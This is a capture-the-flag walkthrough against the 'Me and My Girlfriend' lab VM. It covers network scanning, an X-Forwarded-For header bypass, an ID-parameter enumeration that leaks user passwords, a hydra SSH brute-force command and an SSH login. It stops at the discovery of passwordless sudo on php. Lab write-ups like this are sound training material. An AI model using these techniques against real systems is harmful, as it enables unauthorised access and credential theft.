# Me and My Grilfriend

### 1.Get VM IP

```bash
root@kali: rp-scan -I eth1 -l
Interface: eth1, type: EN10MB, MAC: 00:0c:29:3a:bc:b3, IPv4: 192.168.127.128
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.127.1	00:50:56:c0:00:01	VMware, Inc.
192.168.127.134	00:0c:29:cf:c6:1c	VMware, Inc.
192.168.127.254	00:50:56:f5:f5:14	VMware, Inc.
```

The ip address is `192.168.127.134`, let's enumerate it

### 2.Enumeration

```bash
root@kali: nmap -p- -sT -sV -sC -v -oN nmap.out 192.168.127.134
Nmap scan report for www.convert.me (192.168.127.134)
Host is up (0.0010s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 57:e1:56:58:46:04:33:56:3d:c3:4b:a7:93:ee:23:16 (DSA)
|   2048 3b:26:4d:e4:a0:3b:f8:75:d9:6e:15:55:82:8c:71:97 (RSA)
|   256 8f:48:97:9b:55:11:5b:f1:6c:1d:b3:4a:bc:36:bd:b0 (ECDSA)
|_  256 d0:c3:02:a1:c4:c2:a8:ac:3b:84:ae:8f:e5:79:66:76 (ED25519)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.7 (Ubuntu)
MAC Address: 00:0C:29:CF:C6:1C (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Visiting the web page it says :

![image](https://github.com/Git-K3rnel/VulnHub/assets/127470407/df7752cb-c77e-4b12-98bd-a3473bcb422d)

and the page source says :

![image](https://github.com/Git-K3rnel/VulnHub/assets/127470407/172e804f-93fe-4a5e-9658-7c3262a6ffb6)

config the browser to send traffic to burp and config burp to add new header to each request, `X-Forwarded-For: 127.0.0.1` :

![image](https://github.com/Git-K3rnel/VulnHub/assets/127470407/9740cf2b-7016-4a7b-adfd-5985aeeb3606)

after that you can see the actual page of the website:

![image](https://github.com/Git-K3rnel/VulnHub/assets/127470407/c65f2b46-18d2-4350-ad30-fa1535fe4ca9)

i tried SQLi on register and login page but nothing happened, then i created a user and logged in to the site :

![image](https://github.com/Git-K3rnel/VulnHub/assets/127470407/df73b1e1-267b-42bf-bc35-1baa7ca64f7f)

after seeing the traffic in burp and navigating to profile menue i saw the request :

```text
http://192.168.127.134/index.php?page=profile&user_id=12
```

i change the `user_id` parameter to `1` and it showed another user profile :

![image](https://github.com/Git-K3rnel/VulnHub/assets/127470407/0fa3c04e-7b86-4e6c-9614-6bfa403881c8)


send the request to intruder and try number 1 to 50 for example, and also add `X-Forwarded-For: 127.0.0.1` header to the request

then you will see that multiple user and passwords are shown :

- users

```text
abdikasepak
alice
sedihaingmah
sundatea
aingmaung
eweuhtandingan
```

- passwords

```text
dorrrrr
4lic3
cedihhihihi
indONEsia
qwerty!!!
skuyatuh
```


### 3.Gaining Shell

Save these two lists and try to brute force the ssh service :


```bash
hydra -L users.txt   -P passwords.txt 192.168.127.134 ssh -v -t 10 
```

![image](https://github.com/Git-K3rnel/VulnHub/assets/127470407/cc9f0f26-89ad-4653-b22c-4b3ec4a45d5b)


now login to system with `alice : 4lic3` :

```bash
root@kali: ssh alice@192.168.127.134                                                                                                               
alice@192.168.127.134's password: 
Last login: Sun Apr 28 16:50:29 2024 from 192.168.127.128
alice@gfriEND:~$ id
uid=1000(alice) gid=1001(alice) groups=1001(alice)
```

### 4.Privilege Escalation

Check sudo permissions on the system :

```bash
alice@gfriEND:~$ sudo -l
Matching Defaults entries for alice on gfriEND:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alice may run the following commands on gfriEND:
    (root) NOPASSWD: /usr/bin/php
```





